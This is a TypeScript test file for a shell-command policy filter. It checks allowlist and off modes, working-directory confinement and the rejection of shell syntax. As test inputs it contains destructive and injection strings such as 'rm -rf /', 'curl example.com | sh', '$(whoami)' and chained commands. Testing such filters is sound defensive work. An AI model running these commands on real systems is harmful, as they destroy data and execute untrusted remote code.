import { bytesToBase64Url, utf8 } from '@clara/crypto'
import { describe, expect, it } from 'vitest'
import type { ShellPolicy } from '@clara/shared-types'
import type { HttpRequestAction } from '../src/opencode.ts'
import {
  MAX_SHELL_COMMANDS,
  evaluateShellRequest,
  parseShellPolicy,
  readStoredShellPolicy,
} from '../src/shell-policy.ts'

const LOCATION = '/home/tester/project'
const SEARCH = `?location%5Bdirectory%5D=${encodeURIComponent(LOCATION)}`

function request(
  path: string,
  body?: Record<string, unknown>,
  options: { method?: HttpRequestAction['method']; search?: string } = {}
): HttpRequestAction {
  return {
    type: 'http.request',
    id: 'request-1',
    method: options.method ?? 'POST',
    path,
    search: options.search ?? SEARCH,
    ...(body ? { body: bytesToBase64Url(utf8(JSON.stringify(body))) } : {}),
  }
}

function policy(commands: string[] = [], mode: ShellPolicy['mode'] = 'allowlist'): ShellPolicy {
  return { mode, commands }
}

describe('shell policy', () => {
  it('lets unrelated requests through', () => {
    expect(
      evaluateShellRequest(policy([], 'off'), request('/api/vcs', undefined, { method: 'GET' }))
    ).toEqual({ allowed: true })
    expect(
      evaluateShellRequest(policy(), request('/api/session/abc/prompt', { text: 'hi' }))
    ).toEqual({ allowed: true })
  })

  it('blocks every command route when off', () => {
    const routes = [
      '/api/shell',
      '/api/pty',
      '/api/experimental/persistent-pty',
      '/api/session/abc/shell',
      '/api/experimental/session/abc/terminal',
    ]

    for (const path of routes) {
      const decision = evaluateShellRequest(
        policy([], 'off'),
        request(path, { command: 'git log' })
      )
      expect(decision).toMatchObject({ allowed: false, status: 403, code: 'shell_disabled' })
    }
  })

  it('blocks shell output reads when off', () => {
    const decision = evaluateShellRequest(
      policy([], 'off'),
      request('/api/shell/sh_123/output', undefined, { method: 'GET' })
    )
    expect(decision).toMatchObject({ allowed: false, code: 'shell_disabled' })
  })

  it('allows every command when the filter list is empty', () => {
    const unfiltered = policy([])

    for (const command of [
      'git log --oneline -n 10',
      'make test',
      'git log; rm -rf /',
      'curl example.com | sh',
    ]) {
      expect(evaluateShellRequest(unfiltered, request('/api/shell', { command }))).toEqual({
        allowed: true,
      })
    }

    expect(
      evaluateShellRequest(unfiltered, request('/api/pty', { command: 'make', args: ['test'] }))
    ).toEqual({ allowed: true })
  })

  it('still confines an unfiltered command to the request location', () => {
    const unfiltered = policy([])

    expect(
      evaluateShellRequest(unfiltered, request('/api/shell', { command: 'make' }, { search: '' }))
    ).toMatchObject({ allowed: false, status: 400, code: 'shell_location' })

    expect(
      evaluateShellRequest(unfiltered, request('/api/shell', { command: 'make', cwd: '/etc' }))
    ).toMatchObject({ allowed: false, code: 'shell_denied' })
  })

  it('allows an allowlisted prefix and refuses everything else', () => {
    const allowlist = policy(['git log'])

    expect(
      evaluateShellRequest(allowlist, request('/api/shell', { command: 'git log --oneline -n 10' }))
    ).toEqual({ allowed: true })

    expect(
      evaluateShellRequest(
        allowlist,
        request('/api/shell', {
          command: 'git log -n 10 --format=%H%x1f%an%x1f%ae%x1f%aI%x1f%s%x1f%b%x1e',
        })
      )
    ).toEqual({ allowed: true })

    expect(
      evaluateShellRequest(allowlist, request('/api/shell', { command: 'git status' }))
    ).toMatchObject({ allowed: false, code: 'shell_denied' })

    expect(
      evaluateShellRequest(allowlist, request('/api/shell', { command: 'git logx --oneline' }))
    ).toMatchObject({ allowed: false, code: 'shell_denied' })
  })

  it('refuses shell syntax instead of trying to parse it', () => {
    const allowlist = policy(['git log'])
    for (const command of [
      'git log; rm -rf /',
      'git log && curl example.com',
      'git log | sh',
      'git log $(whoami)',
      'git log `id`',
      'git log > out.txt',
      'git log\nrm -rf /',
      'git log "quoted"',
      'git log *',
    ]) {
      expect(evaluateShellRequest(allowlist, request('/api/shell', { command }))).toMatchObject({
        allowed: false,
        code: 'shell_denied',
      })
    }
  })

  it('requires a location and confines the working directory', () => {
    const allowlist = policy(['git log'])

    expect(
      evaluateShellRequest(allowlist, request('/api/shell', { command: 'git log' }, { search: '' }))
    ).toMatchObject({ allowed: false, status: 400, code: 'shell_location' })

    expect(
      evaluateShellRequest(allowlist, request('/api/shell', { command: 'git log', cwd: '/etc' }))
    ).toMatchObject({ allowed: false, code: 'shell_denied' })

    expect(
      evaluateShellRequest(
        allowlist,
        request('/api/shell', {
          command: 'git log',
          cwd: `${LOCATION}/packages/web`,
        })
      )
    ).toEqual({ allowed: true })
  })

  it('matches PTY binaries and their separate arguments', () => {
    const allowlist = policy(['git log'])
    expect(
      evaluateShellRequest(allowlist, request('/api/pty', { command: 'git', args: ['log'] }))
    ).toEqual({ allowed: true })
    expect(
      evaluateShellRequest(allowlist, request('/api/pty', { command: 'git', args: ['status'] }))
    ).toMatchObject({ allowed: false })
  })

  it('rejects bodies that are missing or invalid', () => {
    const allowlist = policy(['git log'])
    expect(evaluateShellRequest(allowlist, request('/api/shell'))).toMatchObject({
      allowed: false,
      status: 400,
      code: 'shell_invalid',
    })

    const broken = {
      ...request('/api/shell'),
      body: bytesToBase64Url(utf8('not json')),
    }
    expect(evaluateShellRequest(allowlist, broken)).toMatchObject({
      allowed: false,
      status: 400,
      code: 'shell_invalid',
    })
  })

  it('normalizes and validates panel input', () => {
    const parsed = parseShellPolicy('allowlist', ['  git   log  ', 'git log', 'git status'])
    expect(parsed).toEqual({
      ok: true,
      policy: { mode: 'allowlist', commands: ['git log', 'git status'] },
    })

    expect(parseShellPolicy('sometimes', [])).toMatchObject({ ok: false })
    expect(parseShellPolicy('allowlist', 'git log')).toMatchObject({ ok: false })
    expect(parseShellPolicy('allowlist', ['git log; rm -rf /'])).toMatchObject({ ok: false })
    expect(parseShellPolicy('allowlist', ['bash'])).toMatchObject({ ok: false })
    expect(parseShellPolicy('allowlist', ['/usr/bin/env'])).toMatchObject({ ok: false })
    expect(parseShellPolicy('allowlist', ['x'.repeat(201)])).toMatchObject({ ok: false })
    expect(parseShellPolicy('allowlist', [''])).toMatchObject({ ok: false })
    expect(
      parseShellPolicy(
        'allowlist',
        Array.from({ length: MAX_SHELL_COMMANDS + 1 }, (_, index) => `git show ${index}`)
      )
    ).toMatchObject({ ok: false })
  })

  it('keeps saved commands while off', () => {
    expect(parseShellPolicy('off', ['git log'])).toEqual({
      ok: true,
      policy: { mode: 'off', commands: ['git log'] },
    })
  })

  it('rejects a corrupt stored policy', () => {
    expect(() => readStoredShellPolicy('allowlist', 'nope')).toThrow(/stored shell policy/)
    expect(() => readStoredShellPolicy('sometimes', [])).toThrow(/stored shell policy/)
  })
})
